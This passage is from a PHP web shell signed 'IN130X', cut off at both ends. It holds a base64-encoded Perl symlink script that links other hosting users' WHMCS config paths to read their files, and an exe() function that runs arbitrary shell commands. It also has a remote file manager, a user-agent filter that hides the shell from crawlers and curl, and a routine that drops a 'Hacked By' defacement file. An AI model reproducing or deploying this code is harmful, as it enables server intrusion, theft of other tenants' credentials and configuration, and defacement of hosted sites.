kvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9idXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NQU5BR0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRTVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9QdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC91c2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NeS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL215L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BhbmVsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0NCik7DQpmb3JlYWNoIChAYXJyYXkpew0KCW15ICRjb25maWdueWEgPSAkXy0+e2NvbmZpZ2Rpcn07DQoJbXkgJHR5cGVjb25maWcgPSAkXy0+e3R5cGV9Ow0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJzeW0vJHVzZXJueWF+JHR5cGVjb25maWcudHh0Iik7DQoJbWtkaXIgInN5bS8kdXNlcm55YX4kdHlwZWNvbmZpZy50eHQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJzeW0vJHVzZXJueWF+JHR5cGVjb25maWcudHh0L3Jlc3VsdC50eHQiKTsNCgljb3B5KCJzeW0vbmVtdS50eHQiLCJzeW0vJHVzZXJueWF+JHR5cGVjb25maWcudHh0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBTeW1saW5rPC90aXRsZT48L2hlYWQ+IjsNCnByaW50ICc8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSI1OyB1cmw9c3ltIi8+JzsNCnByaW50ICc8Ym9keT48Y2VudGVyPjxoMT5JbmRvbmVzaWFuIFBlb3BsZTwvaDE+JzsNCnByaW50ICc8YSBocmVmPSJzeW0iPkNpbHVrIEJhYSA6cDwvYT4nOw0KdW5saW5rKCQwKTs=";
$GLOBALS['0x']['css'] = "CQkqIHsNCgkJCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCgkJfQ0KCQlib2R5IHsNCgkJCWJhY2tncm91bmQ6IGJsYWNrOw0KCQkJZm9udC1mYW1pbHk6IEdhYnJpb2xhOw0KCQkJY29sb3I6IHdoaXRlOw0KCQl9DQoJCXRleHRhcmVhIHsNCgkJCXJlc2l6ZTogbm9uZTsNCgkJCWJhY2tncm91bmQ6IHNpbHZlcjsNCgkJfQ0KCQlhIHsNCgkJCWNvbG9yOiB3aGl0ZTsNCgkJfQ0KCQlhOmhvdmVyIHsNCgkJCWNvbG9yOiByZWQ7DQoJCX0NCgkJLmZpbGVtYW5hZ2VyLWJveCB7DQoJCQltYXJnaW46IDMwcHg7DQoJCQlwYWRkaW5nOiAxMHB4Ow0KCQkJdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KCQkJYm9yZGVyIDogM3B4IHNvbGlkIHJlZDsNCgkJCWJvcmRlci1yYWRpdXM6IDhweDsNCgkJfQ0KCQl0YWJsZSwgdGgsIHRkIHsNCgkJYm9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlOw0KCQliYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsNCgkJfQ0KCQkubWFpbi1oZWFkZXIgew0KCQkJdGV4dC1hbGlnbjogY2VudGVyOw0KCQkJZm9udC1mYW1pbHk6IEdhYnJpb2xhOw0KCQkJZm9udC1zaXplOiAzMHB4Ow0KCQkJbWFyZ2luOiAyMHB4Ow0KCQl9DQoJCXRyOmhvdmVyIHsNCgkJYmFja2dyb3VuZDogc2lsdmVyOw0KCQljb2xvcjogI2ZmZmZmZjsNCgkJfQ0KCQkubWVudXMgew0KCQkJZmxvYXQ6IHJpZ2h0Ow0KCQl9DQoJCS5kZW0gew0KCQkJcGFkZGluZzogN3B4Ow0KCQkJbWFyZ2luOiAzcHg7DQoJCQl0ZXh0LWRlY29yYXRpb246IG5vbmU7DQoJCQlib3JkZXIgOiAxcHggc29saWQgd2hpdGU7DQoJCX0NCgkJaW5wdXRbdHlwZT10ZXh0XSwgaW5wdXRbdHlwZT1wYXNzd29yZF0sIC5pbnB1dCB7DQoJCWJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyANCgkJY29sb3I6ICNmZmZmZmY7DQoJCWJvcmRlcjogMXB4IHNvbGlkICNmZmZmZmY7DQoJCXBhZGRpbmc6IDNweDsNCgkJZm9udC1mYW1pbHk6ICdVYnVudHUnOw0KCQlmb250LXNpemU6IDEzcHg7DQoJCX0NCgkJaW5wdXRbdHlwZT1zdWJtaXRdIHsNCgkJcGFkZGluZzogMnB4Ow0KCQl9DQoJCWlucHV0W3R5cGU9c3VibWl0XTpob3ZlciB7DQoJCWN1cnNvcjogcG9pbnRlcjsNCgkJfQ0KCQlpbnB1dDpmb2N1cywgdGV4dGFyZWE6Zm9jdXMgew0KICAJCW91dGxpbmU6IDA7DQogIAkJYm9yZGVyLWNvbG9yOiAjZmZmZmZmOw0KCQl9DQoJCXRleHRhcmVhIHsNCgkJYm9yZGVyOiAxcHggc29saWQgI2ZmZmZmZjsNCgkJd2lkdGg6IDEwMCU7DQoJCWhlaWdodDogNDAwcHg7DQoJCXBhZGRpbmctbGVmdDogNXB4Ow0KCQltYXJnaW46IDEwcHggYXV0bzsNCgkJcmVzaXplOiBub25lOw0KCQliYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsNCgkJY29sb3I6ICNmZmZmZmY7DQoJCWZvbnQtZmFtaWx5OiAnVWJ1bnR1JzsNCgkJZm9udC1zaXplOiAxM3B4Ow0KCQl9DQoJCS5tYWluIHsNCgkJbWFyZ2luOiAzMHB4Ow0KCQlwYWRkaW5nOiAxMHB4Ow0KCQl9DQoJCWlmcmFtZSB7DQoJCXdpZHRoOiAxMDAlOw0KCQltaW4taGVpZ2h0OiA1MDBweDsNCgkJfQ==";
$GLOBALS['0x']['privates'] = "DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQoJPHRpdGxlPlRlc3RlZDwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5IHsNCgliYWNrZ3JvdW5kOiAjMDAwOw0KfQ0KaDEgew0KZm9udC1mYW1pbHk6IEdhYnJpb2xhOw0KY29sb3I6IHBpbms7DQpmb250LXNpemU6IDQwcHg7DQptYXJnaW46IDFweCBhdXRvOw0KdGV4dC1hbGlnbjpjZW50ZXI7DQp0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7DQp9DQoubmVvbiB7DQpjb2xvcjogI0ZGRkZGRjsNCnRleHQtc2hhZG93OiAwIDAgNXB4ICNmZjAwMDAsIDAgMCAxMHB4ICNmZjAwMDAsIDAgMCAyMHB4ICNmZjAwMDAsIDAgMCA0NXB4ICNmZjAwMDAsIDAgMCA0MHB4ICNmZjAwMDA7DQp9DQo8L3N0eWxlPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0Kd2luZG93Lm9ubG9hZCA9IGZ1bmN0aW9uKCkgew0KdmFyIGgxID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImgxIilbMF0sDQp0ZXh0ID0gaDEuaW5uZXJUZXh0IHx8IGgxLnRleHRDb250ZW50LA0Kc3BsaXQgPSBbXSwgaSwgbGl0ID0gMCwgdGltZXIgPSBudWxsOw0KZm9yKGkgPSAwOyBpIDwgdGV4dC5sZW5ndGg7ICsraSkgew0Kc3BsaXQucHVzaCgiPHNwYW4+IiArIHRleHRbaV0gKyAiPC9zcGFuPiIpOw0KfQ0KaDEuaW5uZXJIVE1MID0gc3BsaXQuam9pbigiIik7DQpzcGxpdCA9IGgxLmNoaWxkTm9kZXM7DQogDQp2YXIgZmxpY2tlciA9IGZ1bmN0aW9uKCkgew0KbGl0ICs9IDAuMDE7DQppZihsaXQgPj0gMSkgew0KY2xlYXJJbnRlcnZhbCh0aW1lcik7DQp9DQpmb3IoaSA9IDA7IGkgPCBzcGxpdC5sZW5ndGg7ICsraSkgew0KaWYoTWF0aC5yYW5kb20oKSA8IGxpdCkgew0Kc3BsaXRbaV0uY2xhc3NOYW1lID0gIm5lb24iOw0KfSBlbHNlIHsNCnNwbGl0W2ldLmNsYXNzTmFtZSA9ICIiOw0KfQ0KfQ0KfQ0Kc2V0SW50ZXJ2YWwoZmxpY2tlciwgMzAwKTsNCn0NCjwvc2NyaXB0Pg0KPGgxPk1yLklOMTMwWDwvaDE+DQo8L2JvZHk+DQo8L2h0bWw+";
/*
	Function Here 
*/
function source($x){
	return base64_decode($GLOBALS['0x'][$x]);
}

function magics(){
	if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
	$_POST[$key] = stripslashes($value);
	}
}	

}

function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}	
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}
function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}
function antibot(){
	if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
}

function pwd() {
	$dir = explode("/", path());
	foreach($dir as $key => $index) {
		print "<a href='?dir=";
		for($i = 0; $i <= $key; $i++) {
			print $dir[$i];
			if($i != $key) {
			print "/";
			}
		}
		print "'>$index</a>/";
	}
	print "&nbsp;&nbsp;(".writeable(path(), perms(path())).")";
	print "<br>";
	print (OS() === "Windows") ? windisk() : "";
}

function windisk() {
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	$bool = $isdiskette = in_array($letter, array("A"));
	  	if(!$bool) $bool = is_dir("$letter:\\");
	  	if($bool) {
	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
	   		if($letter.":" != $v) {
	   			$letters .= $letter;
	   		}
	   		else {
	   			$letters .= color(1, 2, $letter);
	   		}
	   		$letters .= "</a> ]";
	  	}
	}
	if(!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(path(). "..");
	  		if(empty($v)) {
	  			$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
	  		}
	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
		}
	}
}


function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function privates(){
	save("sad.txt","w","Hacked By IN130X ~");
}

function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function files_and_folder() {
	echo pwd()."<hr>";
	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
	print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		   <tr style="background:silver;color:red;border-radius:7px;border:1px solid black;">
		   <th class="th_home"><center>Name</center></th>
		   <th class="th_home"><center>Type</center></th>
		   <th class="th_home"><center>Size</center></th>
		   <th class="th_home"><center>Last Modified</center></th>
		   <th class="th_home"><center>Owner/Group</center></th>
		   <th class="th_home"><center>Permission</center></th>
		   <th class="th_home"><center>Action</center></th>
		   </tr>';

	if(function_exists('opendir')) {
		if($opendir = opendir(path())) {
			while(($readdir = readdir($opendir)) !== false) {
				$dir[] = $readdir;
			}
			closedir($opendir);
		}
		sort($dir);
	} else {
		$dir = scandir(path());
	}

	foreach($dir as $folder) {
		$dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
		if(!is_dir($dirinfo['path'])) continue;
		$dirinfo['type']  = filetype($dirinfo['path']);
		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
		$dirinfo['size']  = "-";
		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a>";
		if(function_exists('posix_getpwuid')) {
			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
			$dirinfo['owner'] = $dirinfo['owner']->name;
		} else {
			$dirinfo['owner'] = fileowner($dirinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
			$dirinfo['group'] = $dirinfo['group']->name;
		} else {
			$dirinfo['group'] = filegroup($dirinfo['path']);
		}
		print "<tr>";
		print "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>".$dirinfo['link']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['type']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
		print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
		print "</tr>";
	}
	foreach($dir as $files) {
		$fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
		if(!is_file($fileinfo['path'])) continue;
		$fileinfo['type'] = filetype($fileinfo['path']);
		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
		$fileinfo['size'] = filesize($fileinfo['path'])/1024;
		$fileinfo['size'] = round($fileinfo['size'],3);
		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
		$fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
		if(function_exists('posix_getpwuid')) {
			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
			$fileinfo['owner'] = $fileinfo['owner']->name;
		} else {
			$fileinfo['owner'] = fileowner($fileinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
			$fileinfo['group'] = $fileinfo['group']->name;
		} else {
			$fileinfo['group'] = filegroup($fileinfo['path']);
		}
		print "<tr>";
